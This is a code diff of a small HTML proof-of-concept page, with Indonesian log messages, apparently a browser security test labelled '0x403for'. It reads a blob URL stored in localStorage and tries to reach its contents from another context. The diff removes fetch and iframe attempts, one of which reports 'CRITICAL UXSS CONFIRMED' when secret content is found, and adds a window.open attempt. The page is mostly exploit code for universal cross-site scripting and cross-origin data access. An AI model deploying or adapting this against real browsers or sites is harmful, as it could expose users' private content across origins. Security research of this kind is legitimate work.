@@ -2,15 +2,13 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Blob Inheritance Test - Updated</title>
+<title>Blob Navigation Test - 0x403for</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;padding:15px">
-<h2>STEP 2 - Test di 0x403for</h2>
+<h2>STEP 2 - Test di 0x403for (Window Open)</h2>
 <pre id=log></pre>
 <button onclick="checkLeak()" style="padding:14px;width:100%;background:#0f0;color:#000;font-weight:bold;cursor:pointer">1. Check localStorage leak</button>
-<button onclick="tryFetchBlob()" style="padding:14px;width:100%;background:#0f0;color:#000;font-weight:bold;margin-top:6px;cursor:pointer">2. TRY FETCH blob:</button>
-<button onclick="tryIframeBlob()" style="padding:14px;width:100%;background:#0f0;color:#000;font-weight:bold;margin-top:6px;cursor:pointer">3. TRY IFRAME blob:</button>
-<iframe id=frame style="width:100%;height:200px;background:#fff;margin-top:10px;border:1px solid #0f0"></iframe>
+<button onclick="tryOpenBlob()" style="padding:14px;width:100%;background:#0f0;color:#000;font-weight:bold;margin-top:6px;cursor:pointer">2. TRY OPEN blob: via window.open()</button>
 
 <script>
 function log(t){
@@ -27,48 +25,24 @@ function checkLeak(){
   }
 }
 
-async function tryFetchBlob(){
+function tryOpenBlob(){
   let blobUrl = localStorage.getItem('aqua_blob_url');
   if(!blobUrl){
     log('[-] Abort: Jalankan langkah 1 terlebih dahulu.');
     return;
   }
   
-  log('[*] Mencoba fetch URL: ' + blobUrl);
+  log('[*] Membuka blob URL di jendela/tab baru: ' + blobUrl);
   try {
-    let res = await fetch(blobUrl);
-    let text = await res.text();
-    log('[+] FETCH SUCCESS (Panjang: ' + text.length + ' bytes)');
-    log('Preview: ' + text.substring(0, 200));
-    
-    if(text.includes('SECRET')){
-      log('>>> CRITICAL UXSS CONFIRMED: Konten rahasia berhasil diakses!');
+    let win = window.open(blobUrl, '_blank');
+    if(!win) {
+      log('[-] Pop-up diblokir oleh browser.');
     } else {
-      log('[?] Konten berhasil diambil, tetapi teks "SECRET" tidak ditemukan.');
+      log('[+] Jendela berhasil dibuka. Periksa apakah konten target (termasuk isi blob) berhasil dirender.');
     }
   } catch(e) {
-    log('[-] BLOCKED / ERROR: ' + e.name + ' - ' + e.message);
+    log('[-] ERROR: ' + e.message);
   }
-}
-
-function tryIframeBlob(){
-  let blobUrl = localStorage.getItem('aqua_blob_url');
-  if(!blobUrl){
-    log('[-] Abort: Jalankan langkah 1 terlebih dahulu.');
-    return;
-  }
-  
-  log('[*] Memuat blob URL ke dalam iframe: ' + blobUrl);
-  let frame = document.getElementById('frame');
-  
-  frame.onload = function() {
-    log('[+] Iframe berhasil memuat sumber.');
-  };
-  frame.onerror = function(e) {
-    log('[-] Iframe gagal memuat sumber.');
-  };
-  
-  frame.src = blobUrl;
 }
 </script>
 </body>
